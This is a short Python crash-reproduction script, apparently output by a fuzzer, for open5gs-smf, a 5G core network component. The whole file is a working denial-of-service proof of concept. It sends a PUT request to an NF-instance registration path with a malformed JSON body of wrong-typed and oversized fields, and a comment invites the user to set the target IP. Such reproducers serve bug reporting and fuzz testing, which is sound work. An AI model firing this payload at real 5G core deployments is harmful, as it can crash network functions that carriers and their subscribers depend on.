#!/usr/bin/env python3
# Crash reproduction for open5gs-smf (info)
# Detected: Sat May  9 07:55:31 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PUT'
path = '/nnrf-nfm/v1/nf-instances/AMF-fuzz-9164'
body = b'{"nfInstanceId": 99999, "nfType": 99999, "nfStatus": 99999, "ipv4Addresses": "not_a_list", "fqdn": 99999, "priority": "1", "capacity": "2147483648", "load": "2147483648", "nfServices": "not_a_list", "n1MessageContainer": ["corrupted"]}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
